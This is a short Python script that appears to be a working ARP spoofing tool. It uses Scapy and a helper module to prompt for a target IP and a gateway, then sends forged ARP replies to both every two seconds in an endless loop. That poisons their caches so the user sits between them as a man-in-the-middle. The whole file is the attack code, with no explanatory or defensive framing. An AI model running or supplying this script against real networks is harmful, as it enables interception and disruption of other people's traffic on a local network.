import scapy.all as sc
import MACFInder as mf
import time

import threading
mf.fx()
ip=input("SELECT IP ADDRESS:\t")
iph=input("SELECT THE GATEWAY:\t")
print (mf.fx2(iph))

def spoof(tip,fip):
    r=sc.ARP(op=2,pdst=tip,hwdst=mf.fx2(tip),psrc=fip)
    sc.send(r,verbose=False)
def active():
    while True:
        spoof(ip,iph)
        spoof(iph,ip)
        time.sleep(2)

active()





